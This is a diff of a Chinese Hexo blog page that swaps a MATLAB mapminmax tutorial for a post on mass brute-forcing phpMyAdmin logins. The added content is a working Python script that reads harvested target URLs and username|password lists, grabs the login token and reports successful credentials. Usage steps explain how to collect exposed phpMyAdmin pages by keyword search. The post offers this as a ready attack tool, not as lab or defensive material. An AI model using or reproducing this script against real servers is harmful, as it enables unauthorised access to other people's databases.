@@ -4,9 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="matlab中mapminmax函数的总结, 凡尘里的星">
-    <meta name="description" content="01 mapminmax()函数mapminmax()函数主要是用来对数据进行归一化处理的函数，它把所有的数据都转换为(0，1)之间的数，目的就是取消各维数据间的数量别差别，防止大数吃小数的现象。
-02 函数接口[Y,PS] = mapmi">
+    <meta name="keywords" content="python批量爆破phpMyadmin, 凡尘里的星">
+    <meta name="description" content="使用python实现phpMyadmin的批量爆破0x01 脚本实现import requests
+from bs4 import BeautifulSoup as bp
+def attack(url,username,password):">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>matlab中mapminmax函数的总结 | 凡尘里的星</title>
+    <title>python批量爆破phpMyadmin | 凡尘里的星</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -258,13 +259,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        matlab中mapminmax函数的总结
+                        python批量爆破phpMyadmin
                     </div>
                 </div>
             </div>
@@ -375,8 +376,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/机器学习/" target="_blank">
-                                <span class="chip bg-color">机器学习</span>
+                            <a href="/tags/python黑客编程/" target="_blank">
+                                <span class="chip bg-color">python黑客编程</span>
                             </a>
                         
                     </div>
@@ -406,33 +407,52 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="01-mapminmax-函数"><a href="#01-mapminmax-函数" class="headerlink" title="01 mapminmax()函数"></a>01 mapminmax()函数</h2><p><code>mapminmax()</code>函数主要是用来对数据进行归一化处理的函数，它把所有的数据都转换为<code>(0，1)</code>之间的数，目的就是取消各维数据间的数量别差别，防止大数吃小数的现象。</p>
-<h2 id="02-函数接口"><a href="#02-函数接口" class="headerlink" title="02 函数接口"></a>02 函数接口</h2><pre><code>[Y,PS] = mapminmax(X)
-[Y,PS] = mapminmax(X,FP)
-Y = mapminmax(&#39;apply&#39;,X,PS)
-X = mapminmax(&#39;reverse&#39;,Y,PS)
-</code></pre><h3 id="02-1-函数参数说明"><a href="#02-1-函数参数说明" class="headerlink" title="02-1 函数参数说明"></a>02-1 函数参数说明</h3><p><code>Y</code>是归一化得到的数据，<code>PS</code>是一种描述数据的结构。它们的计算方式是<code>y = (ymax-ymin)*(x-xmin)/(xmax-xmin) + ymin;</code></p>
-<p>倘若这个向量里面有两个相同的数，那么上式就变成分母<code>xmax</code>-<code>xmin</code>为零，这样怎么处理？</p>
-<p><code>matlab</code>在这时会变成<code>y=ymin</code>，<code>ymax</code>和<code>ymin</code>这两个值默认为<code>-1</code>到<code>1</code>，也可以自己设置。</p>
-<p>设置举例：</p>
-<pre class=" language-python"><code class="language-python"><span class="token operator">>></span> clear
-<span class="token operator">>></span> l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span> l <span class="token operator">=</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token operator">>></span> k<span class="token punctuation">.</span>ymin<span class="token operator">=</span><span class="token number">0</span> k <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> ymin<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token operator">>></span> k<span class="token punctuation">.</span>ymax<span class="token operator">=</span><span class="token number">1</span> k <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> ymin<span class="token punctuation">:</span> <span class="token number">0</span>
-ymax<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token operator">>></span> <span class="token punctuation">[</span>m<span class="token punctuation">,</span>n<span class="token punctuation">]</span><span class="token operator">=</span>mapminmax<span class="token punctuation">(</span>l<span class="token punctuation">,</span>k<span class="token punctuation">)</span> m <span class="token operator">=</span> <span class="token number">0</span> <span class="token number">0.3333</span> <span class="token number">0.6667</span> <span class="token number">1.0000</span> n <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> name<span class="token punctuation">:</span> <span class="token string">'mapminmax'</span>
-xrows<span class="token punctuation">:</span> <span class="token number">1</span>
-xmax<span class="token punctuation">:</span> <span class="token number">4</span>
-xmin<span class="token punctuation">:</span> <span class="token number">1</span>
-xrange<span class="token punctuation">:</span> <span class="token number">3</span>
-yrows<span class="token punctuation">:</span> <span class="token number">1</span>
-ymax<span class="token punctuation">:</span> <span class="token number">1</span>
-ymin<span class="token punctuation">:</span> <span class="token number">0</span>
-yrange<span class="token punctuation">:</span> <span class="token number">1</span>
-gain<span class="token punctuation">:</span> <span class="token number">0.3333</span>
-xoffset<span class="token punctuation">:</span> <span class="token number">1</span>
-no_change<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token operator">></span> 上面还可以这样设置：<span class="token punctuation">[</span>Y<span class="token punctuation">,</span>PS<span class="token punctuation">]</span> <span class="token operator">=</span> mapminmax<span class="token punctuation">(</span>X<span class="token punctuation">,</span>ymin<span class="token punctuation">,</span>ymax<span class="token punctuation">)</span>
+                <h2 id="使用python实现phpMyadmin的批量爆破"><a href="#使用python实现phpMyadmin的批量爆破" class="headerlink" title="使用python实现phpMyadmin的批量爆破"></a>使用python实现phpMyadmin的批量爆破</h2><h3 id="0x01-脚本实现"><a href="#0x01-脚本实现" class="headerlink" title="0x01 脚本实现"></a>0x01 脚本实现</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup <span class="token keyword">as</span> bp
+<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"</span><span class="token punctuation">}</span>
+    session<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        response<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+        soup<span class="token operator">=</span>bp<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>
+        my_Dict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"hidden"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">}</span>
+        tiqu<span class="token operator">=</span>soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>attrs<span class="token operator">=</span>my_Dict<span class="token punctuation">)</span>
+        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+        data<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span><span class="token operator">=</span>tiqu<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"no token"</span>
+        data<span class="token punctuation">[</span><span class="token string">'pma_username'</span><span class="token punctuation">]</span><span class="token operator">=</span>username
+        data<span class="token punctuation">[</span><span class="token string">'pma_password'</span><span class="token punctuation">]</span><span class="token operator">=</span>password
+        index_url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"index.php"</span>
+        response1<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>index_url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        htmls<span class="token operator">=</span>response1<span class="token punctuation">.</span>text
+        <span class="token keyword">if</span> <span class="token string">"phpMyAdmin is more friendly with a "</span> <span class="token keyword">in</span> htmls<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] username:{0}, password:{1}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./Good.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> urls<span class="token punctuation">:</span>
+        host_t<span class="token operator">=</span>urls<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> url <span class="token keyword">in</span> host_t<span class="token punctuation">:</span>
+            <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'\n'</span><span class="token punctuation">:</span>
+                url<span class="token operator">=</span>url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+            <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"mima.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> mima<span class="token punctuation">:</span>
+                my_mima<span class="token operator">=</span>mima<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">for</span> mima <span class="token keyword">in</span> my_mima<span class="token punctuation">:</span>
+                    username<span class="token punctuation">,</span>password<span class="token operator">=</span>mima<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span>
+                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"attack {0} use username:{1}|password:{2}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    attack<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>
+
 </code></pre>
-<h2 id="03-函数接口说明"><a href="#03-函数接口说明" class="headerlink" title="03 函数接口说明"></a>03 函数接口说明</h2><p>上面已经讲了，<code>1</code>和<code>2</code>函数接口，<code>3</code>函数接口<code>Y = mapminmax(&#39;apply&#39;,X,PS)</code>主要是用来对其他向量采取同样的归一化（继续采用上面向量的<code>xmax</code>和<code>xmin</code>）对其归一化。 第三种<code>X = mapminmax(&#39;reverse&#39;,Y,PS)</code>就是对数据进行反归一化，就是通过存储在<code>PS</code>的结构的值计算原来的值。</p>
-<h2 id="04-矩阵归一化"><a href="#04-矩阵归一化" class="headerlink" title="04 矩阵归一化"></a>04 矩阵归一化</h2><p>默认规范范围<code>(-1,1)</code>若想将规范范围划为<code>(-1,1)</code>，可编写<code>Y=mapminmax(A,0,1);</code></p>
-<p>此函数规整行向量中最大最小值，如果运用此函数，则<code>A</code>矩阵每一行为一个维度，每一列是一个样本，所以一般在使用这个函数对样本进行归一化的时候就要将矩阵转置。</p>
+<h3 id="0x02-脚本的使用"><a href="#0x02-脚本的使用" class="headerlink" title="0x02 脚本的使用"></a>0x02 脚本的使用</h3><ul>
+<li>先用批量采集工具采集url（关键词：“欢迎使用 phpMyadmin”）</li>
+<li>将采集的url导出为Good.txt路径</li>
+<li>然后密码的格式为:    root|toor  ，|左边为root,右边为toor</li>
+</ul>
 
             </div>
             <hr>
@@ -580,7 +600,7 @@ no_change<span class="token punctuation">:</span> <span class="token number">0</
                     </span>
                     <a href="http://yoursite.com" class="b-link-green">凡尘里的星</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/" class="b-link-green">matlab中mapminmax函数的总结</a>
+                    <a href="/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/" class="b-link-green">python批量爆破phpMyadmin</a>
                 </p>
             </div>
         </div>
@@ -603,25 +623,23 @@ no_change<span class="token punctuation">:</span> <span class="token number">0</
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/">
+                <a href="/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="matlab中mapminmax函数的总结">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="机器学习之线性回归方法">
                         
-                        <span class="card-title">matlab中mapminmax函数的总结</span>
+                        <span class="card-title">机器学习之线性回归方法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">01 mapminmax()函数mapminmax()函数主要是用来对数据进行归一化处理的函数，它把所有的数据都转换为(0，1)之间的数，目的就是取消各维数据间的数量别差别，防止大数吃小数的现象。
-02 函数接口[Y,PS] = mapmi</div>
+                    <div class="summary">1. 多元线性回归以预测房子价格为例，房子的属性除了其面积大小外，这里还有房子楼层数、房子年龄、厅室数等。也就是说一个房子的特征将不只一个，而是多个。这里用n表示特征数目，x(i)表示的是训练集中第i个样本的特征向量，x(i)j表示的第i个</div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-12
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-12
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -630,7 +648,6 @@ no_change<span class="token punctuation">:</span> <span class="token number">0</
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -649,17 +666,18 @@ no_change<span class="token punctuation">:</span> <span class="token number">0</
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/">
+                <a href="/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="机器学习之线性回归方法">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="python自动登陆校园网">
                         
-                        <span class="card-title">机器学习之线性回归方法</span>
+                        <span class="card-title">python自动登陆校园网</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1. 多元线性回归以预测房子价格为例，房子的属性除了其面积大小外，这里还有房子楼层数、房子年龄、厅室数等。也就是说一个房子的特征将不只一个，而是多个。这里用n表示特征数目，x(i)表示的是训练集中第i个样本的特征向量，x(i)j表示的第i个</div>
+                    <div class="summary">由于每次打开电脑都要手动的登录校园网，导致很麻烦，所以写了一个爬虫来模拟浏览器自动登录校园网的功能
+1.使用Burpsuit对校园网登录界面进行抓包分析简介：burpsuite是一款渗透工具，运行环境是Java，所以需要先配置,主要可以用来</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-12
@@ -675,8 +693,8 @@ no_change<span class="token punctuation">:</span> <span class="token number">0</
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/机器学习/" target="_blank">
-                        <span class="chip bg-color">机器学习</span>
+                    <a href="/tags/python黑客编程/" target="_blank">
+                        <span class="chip bg-color">python黑客编程</span>
                     </a>
                     
                 </div>
